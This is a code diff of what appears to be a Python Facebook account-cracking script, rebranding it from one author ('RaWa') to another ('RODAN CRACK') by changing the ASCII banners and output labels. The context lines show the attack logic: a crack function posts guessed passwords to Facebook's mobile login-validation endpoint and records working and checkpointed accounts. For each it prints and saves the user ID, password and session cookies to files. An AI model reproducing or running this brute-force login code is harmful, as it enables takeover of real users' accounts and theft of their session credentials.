@@ -140,49 +140,36 @@ def back():
 def none():
 	clear()
 	prints(nel(f"""\t {color_text} 
-       
+ {B2}      
 
-██████   █████  ██     ██  █████  
-██   ██ ██   ██ ██     ██ ██   ██ 
-██████  ███████ ██  █  ██ ███████ 
-██   ██ ██   ██ ██ ███ ██ ██   ██ 
-██   ██ ██   ██  ███ ███  ██   ██
-
-
-
-\33[1;92m ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■
-\33[1;36m TOOL CREATE BY➢  RaWa
-\33[1;34m CHENEL➢ NO
-\33[1;36m TELGRAM➢ & @l4m_rawa
-\33[1;34m VERSION➢1.2
-\33[1;32m RAWA is the father of Telegram
-\33[1;34m EXPIRED TOOL➢3DAYS
-\33[1;92m ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■""")
+██████╗  ██████╗ ██████╗  █████╗ ███╗   ██╗
+██╔══██╗██╔═══██╗██╔══██╗██╔══██╗████╗  ██║
+██████╔╝██║   ██║██║  ██║███████║██╔██╗ ██║
+██╔══██╗██║   ██║██║  ██║██╔══██║██║╚██╗██║
+██║  ██║╚██████╔╝██████╔╝██║  ██║██║ ╚████║
+╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝
+                                            
+                                              
+         Made By {M2}RODAN {P2}CRACK""",width=80,style=f"{color_panel}"))
+def info():
+	prints(f"""{B2}╭─────────────────────╮{B2}╭───────────────╮
+{B2}│ {P2}Author : RODAN{B2} │{B2}│ {P2}Version : 1.0{B2} │
+{B2}╰─────────────────────╯{B2}╰───────────────╯""")
 def banner():
 	clear()
 	prints(nel(f"""\t {color_text} 
-       
+ {B2}      
 
-██████   █████  ██     ██  █████  
-██   ██ ██   ██ ██     ██ ██   ██ 
-██████  ███████ ██  █  ██ ███████ 
-██   ██ ██   ██ ██ ███ ██ ██   ██ 
-██   ██ ██   ██  ███ ███  ██   ██
-
-
-
-\33[1;92m ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■
-\33[1;36m TOOL CREATE BY➢  RaWa
-\33[1;34m CHENEL➢ NO
-\33[1;36m TELGRAM➢ & @l4m_rawa
-\33[1;34m VERSION➢1.2
-\33[1;32m RAWA is the father of Telegram
-\33[1;34m EXPIRED TOOL➢3DAYS
-\33[1;92m ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■
+██████╗  ██████╗ ██████╗  █████╗ ███╗   ██╗
+██╔══██╗██╔═══██╗██╔══██╗██╔══██╗████╗  ██║
+██████╔╝██║   ██║██║  ██║███████║██╔██╗ ██║
+██╔══██╗██║   ██║██║  ██║██╔══██║██║╚██╗██║
+██║  ██║╚██████╔╝██████╔╝██║  ██║██║ ╚████║
+╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝
                                            
                                            
                                               
-"))
+         Made By {M2}RODAN {P2}CRACK""",width=80,style=f"{color_panel}"))
 # LOGIN
 # new cooki 
 def login():
@@ -1052,7 +1039,7 @@ def crack(idf,pwv):
 }
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				print(f'├──RAWA CP ID  : {kk}{idf}{P} \n│   └──  THNS CP PASS  : {kk}{pw}{P}\n└── User Agent  : {kk}{ua}{P} ')
+				print(f'├──THNS CP ID  : {kk}{idf}{P} \n│   └──  THNS CP PASS  : {kk}{pw}{P}\n└── User Agent  : {kk}{ua}{P} ')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -1061,7 +1048,7 @@ def crack(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'├── RAWA OK ID  : {hh}{idf}{P} \n│   └── RODAN OK PASS  : {hh}{pw} {P}\n└──  CookieS : {hh}{kuki}{P}')
+				print(f'├── RODAN OK ID  : {hh}{idf}{P} \n│   └── RODAN OK PASS  : {hh}{pw} {P}\n└──  CookieS : {hh}{kuki}{P}')
 				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
 				break
 			else:
